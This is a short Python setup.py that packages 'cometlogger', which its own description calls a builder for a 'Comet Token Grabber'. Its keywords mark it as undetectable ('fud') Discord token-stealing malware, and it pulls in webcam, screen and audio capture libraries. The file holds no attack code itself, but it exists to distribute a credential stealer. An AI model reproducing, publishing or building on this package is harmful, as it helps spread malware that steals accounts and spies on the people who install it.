from setuptools import setup , find_packages
VERSION = '0.0.1'
DESCRIPTION = 'Comet Token Grabber'
LONG_DESCRIPTION = 'A package that is for building comet token grabber'
setup(
     name='cometlogger',
     package=find_packages(),
     keywords=['discord', 'fud', 'tokengrabber', 'comet'],
     author="Comet Token Grabber (Gurucharan.dll)",
     description=DESCRIPTION,
     long_description_content_type="text/markdown",
     long_description=LONG_DESCRIPTION,
     install_requires=['opencv-python', 'pyautogui', 'pyaudio'],

)